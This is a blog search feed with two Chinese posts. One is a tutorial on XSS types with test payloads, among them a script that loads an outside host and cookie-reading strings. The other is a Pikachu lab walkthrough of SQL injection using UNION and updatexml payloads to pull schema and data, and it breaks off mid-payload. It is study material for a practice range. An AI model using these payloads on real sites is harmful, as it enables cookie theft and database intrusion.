<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xss漏洞相关学习</title>
      <link href="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>XSS全称：跨站脚本(Cross Site Scripting) ,又称跨站脚本攻击，是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种，服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</p><p>xss漏洞分为三种：反射型，存储型和DOM型</p><h2 id="相关知识准备"><a href="#相关知识准备" class="headerlink" title="相关知识准备"></a>相关知识准备</h2><h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替， 例如 <script>alert(1)</script//</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">##&lt;script&gt;标签</span><br><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line"></span><br><span class="line">##svg标签</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">##&lt;img&gt;标签</span><br><span class="line">&lt;img src=1 οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img src=1 οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line"></span><br><span class="line">##&lt;body&gt;标签</span><br><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">##video标签</span><br><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">##style标签</span><br><span class="line">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置"></a>插入位置</h3><ol><li>用户输入作为script标签内容</li><li>用户输入作为HTML注释内容</li><li>用户输入作为HTML标签的属性名</li><li>用户输入作为HTML标签的属性值</li><li>用户输入作为HTML标签的名字</li><li>直接插入到CSS里</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;!-- 用户输入 --&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;</span><br><span class="line">&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;style&gt;用户输入&lt;style&gt;</span><br><span class="line">&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>反射型xss漏洞又称非持久型xss漏洞，攻击往往是一次性的，非持久化，需要欺骗用户自己去点击链接才能触发xss代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型xss大多数是用来盗取用户的Cookie信息。</p><p>攻击者通过发送电子邮件等方式将包含xss代码的恶意链接发送给目标用户，当用户目标访问该链接时，服务器会接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析了这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p><p>下边拿pikachu靶场的xss漏洞举例，当我们在保单提交的页面提交数据后，数据会被输出到输出表单中，譬如下图，我们可以看到当我们输入11后，表单会回显我不在乎谁是11。</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811114650850.png" class="" title="image-20240811114650850"><p>此时我们发现页面的url变成了下图的模样，那么如果我们将xss语句写在messege里，我们会发现这里执行了我们的弹窗，说明<script>代码被执行了，呢如果我们将代码换一下，换成document.cookie，我们会发现我们拿到了cookie的值</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171537808.png" class="" title="image-20240811171537808"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171724996.png" class="" title="image-20240811171724996"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811171935579.png" class="" title="image-20240811171935579"><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>相较于反射型XSS，存储型XSS具有持久性特点。攻击者将恶意脚本永久地存储在目标服务器上，例如在博客文章内容、用户个人资料、论坛帖子等位置。每当任何用户访问到包含此类恶意内容的页面时，浏览器都会执行其中的恶意脚本。</p><p>例如，攻击者在发帖的过程中，将恶意脚本(例如下边的payload)连同正常信息一起注入帖子的内容中，随着帖子被服务器存储下来，恶意脚本也会存放在服务器的后端存储器中，当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hack by hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811174131190.png" class="" title="image-20240811174131190"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811174143029.png" class="" title="image-20240811174143029"><h3 id="DOM型xss漏洞"><a href="#DOM型xss漏洞" class="headerlink" title="DOM型xss漏洞"></a>DOM型xss漏洞</h3><p>这种类型的XSS不涉及服务器端的数据存储，而是发生在客户端层面，即浏览器解析和动态修改DOM树的过程中。如果Web应用程序错误地使用来自不可信源的数据更新DOM，并且没有实施恰当的防御措施，攻击者就可以利用DOM-XSS漏洞注入恶意脚本。</p><p>这里也是以pikachu靶场domxss举例，输入任意内容，发现what do you see字样，来到控制台ctrl + F来搜索这句话，发现一个js里存在这句话，我们闭合之后使用payload，点击出现的what do you see就可以弹窗</p><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811182047408.png" class="" title="image-20240811182047408"><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811181849914.png" class="" title="image-20240811181849914"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;ourobros&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><img src="/2024/08/10/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240811182331269.png" class="" title="image-20240811182331269">]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> xss漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场-sql注入</title>
      <link href="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>来到第一关，查询1，发现以下内容，抓个包，发现id参数在报文结尾，尝试注入</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807150838540.png" class="" title="image-20240807150838540"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807150937769.png" class="" title="image-20240807150937769"><p>输入id&#x3D;1’,id&#x3D;1”都报错，初步确定为数字型注入，输入以下内容查看返回结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1--+</span><br><span class="line">id=1 and 1=2--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151047621.png" class="" title="image-20240807151047621"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807161223794.png" class="" title="image-20240807161223794"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151306347.png" class="" title="image-20240807151306347"><p>结果不同，确定为数字型注入，开始确定字段行数，最终确定行数为2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 3--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151842335.png" class="" title="image-20240807151842335"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807151901093.png" class="" title="image-20240807151901093"><p>开始尝试注入，确定位置为姓名为1，email为2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152215484.png" class="" title="image-20240807152215484"><p>获取当前数据库版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,version()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152847190.png" class="" title="image-20240807152847190"><p>获取当前用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,user()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152516383.png" class="" title="image-20240807152516383"><p>获取当前库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807152616601.png" class="" title="image-20240807152616601"><p>获取其他库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+             #获取全部库名，后续不再使用</span><br><span class="line">id=-1 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1--+                                    #获取第一行库名</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153425664.png" class="" title="image-20240807153425664"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153627335.png" class="" title="image-20240807153627335"><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153502694.png" class="" title="image-20240807153502694"><p>获取字段名</p><p>第一行是id没什么用，这里我们查第二行，是userid…….,算了，全拿出来吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,column_name from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27; limit 1,1--+</span><br><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807153942345.png" class="" title="image-20240807153942345"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154036749.png" class="" title="image-20240807154036749"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154214136.png" class="" title="image-20240807154214136"><p>看看值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807154621053.png" class="" title="image-20240807154621053"><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>与其说时字符型注入，我更倾向于叫这关报错注入，因为时查看报错信息判断的注入方式</p><p>来到第二关，当我们输入?name&#x3D;1时,会返回一串没什么卵用的信息，我们输入1”时，会返回你输入的username不存在，我们输入1’，返回报错信息。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807160950184.png" class="" title="image-20240807160950184"><p>那这一关我们将参数后加上’，后续与第一关一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; and 1=1--+</span><br><span class="line">name=1&#x27; and 1=2--+</span><br><span class="line"></span><br><span class="line">name=1&#x27; order by 3--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,2--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,version()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,user()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,database()--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br><span class="line"></span><br><span class="line">name=-1&#x27; union select 1,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><p>既然注入方式判断和报错注入差不多，我们就试试报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=1&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807163834766.png" class="" title="image-20240807163834766"><p>果然，这一关是可以使用报错注入的。</p><p>相关payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ </span><br><span class="line">                                                              #方法一</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+            #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27; limit 0,1),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select ipaddress from httpinfo limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>我们在发送name&#x3D;1的报文，发现返回一堆的信息，都没啥卵用，发送name&#x3D;1”会筛选掉一部分，但是也没看出来有什么卵用。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170333881.png" class="" title="image-20240807170333881"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170437884.png" class="" title="image-20240807170437884"><p>之后发现如果输入?username&#x3D;1’,会返回报错信息，通过报错信息，判断闭合方式为%’</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807170631404.png" class="" title="image-20240807170631404"><p>将单引号换成%’构造payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%&#x27; order by 4--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171406386.png" class="" title="image-20240807171406386"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171440075.png" class="" title="image-20240807171440075"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,version()--+</span><br><span class="line"></span><br><span class="line">name=-1%&#x27; union select 1,user()--+</span><br><span class="line"></span><br><span class="line">name=-1%&#x27; union select 1,database()--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171531504.png" class="" title="image-20240807171531504"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171549882.png" class="" title="image-20240807171549882"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807171607177.png" class="" title="image-20240807171607177"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172434625.png" class="" title="image-20240807172434625"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+  </span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172517355.png" class="" title="image-20240807172517355"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172610771.png" class="" title="image-20240807172610771"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172644802.png" class="" title="image-20240807172644802"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172736060.png" class="" title="image-20240807172736060"><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>根据1’的报错判断闭合方式,确定为’)</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807191041457.png" class="" title="image-20240807191041457"><p>后续payload与前边一样，只是单引号换成’),这里就不写了。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807190954129.png" class="" title="image-20240807190954129"><h2 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h2><p>来到这一关，发现三个页面，一个注册界面一个登陆界面，还有一个修改个人信息界面</p><h4 id="注册界面"><a href="#注册界面" class="headerlink" title="注册界面"></a>注册界面</h4><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115043988.png" class="" title="image-20240809115043988"><p>抓个包，查看报错信息。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115138681.png" class="" title="image-20240809115138681"><p>发现闭合时要加上括号，我们加上括号试试</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115425012.png" class="" title="image-20240809115425012"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115409015.png" class="" title="image-20240809115409015"><p>括号似乎被注释掉了，我们双写试试</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115510343.png" class="" title="image-20240809115510343"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115504010.png" class="" title="image-20240809115504010"><p>发现还是无法闭合，与后边对比，少了一个’，加上之后就不返回报错信息了，在尝试中，发现)’’和’’))也不返回报错信息，之后我们尝试注入，发现不返回报错信息</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115654303.png" class="" title="image-20240809115654303"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115932941.png" class="" title="image-20240809115932941"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809120140032.png" class="" title="image-20240809120140032"><p>看看报错注入能用不能，发现不能，没有回显,如果在参数处闭合payload，会没有回显，我们把payload写在闭合符号中间，为了使语句完整，我们要在后边的闭合符号前加上and或者or</p><p>经过测试，发现之前发现的闭合符号只有’’))能用，直到我发现还有一个双引号还没试，所以正确的闭合方式其实是’’我们把payload双引号写在双引号中间，成功注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#这里要注意一点，我也是后来才发现的，如果这里使用注释符，注释符的作用是将后边的内容给注释掉，但是很显然，这里这一串数据后端都要接收，注释符会把后边的内容注释掉，使后端收不到数据，所以在前边测试注入时，如果带上注释符，应该构造后边五个数据的参数所以前边测试闭合的payload应该是</span><br><span class="line"></span><br><span class="line">1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;)--+</span><br></pre></td></tr></table></figure><p>所以完整的流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and&#x27;  </span><br><span class="line">                                                   #方法一(获取当前库名)</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select 